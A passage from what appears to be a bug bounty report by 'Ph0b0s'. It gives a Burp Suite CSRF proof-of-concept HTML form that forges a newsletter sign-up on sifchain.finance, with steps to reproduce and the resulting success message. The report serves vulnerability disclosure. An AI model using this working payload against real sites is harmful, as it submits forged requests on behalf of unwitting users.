ou, your sign-up request was successful! Please check your email inbox to confirm.</p></div>\n\n\n\nPoC:\n\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://sifchain.finance/\" method=\"POST\">\n      <input type=\"hidden\" name=\"EMAIL\" value=\"any&#64;anyy&#46;com\" />\n      <input type=\"hidden\" name=\"&#95;mc4wp&#95;honeypot\" value=\"\" />\n      <input type=\"hidden\" name=\"&#95;mc4wp&#95;timestamp\" value=\"1620658126\" />\n      <input type=\"hidden\" name=\"&#95;mc4wp&#95;form&#95;id\" value=\"204\" />\n      <input type=\"hidden\" name=\"&#95;mc4wp&#95;form&#95;element&#95;id\" value=\"mc4wp&#45;form&#45;1\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n\n\n1. save as .html file\n2. open in browser chrome or firefox\n\nand as you can see \"Thank you, your sign-up request was successful! Please check your email inbox to confirm\"\n\n\nCheers,\nPh0b0s\n\n## Impact\n\nCSRF",
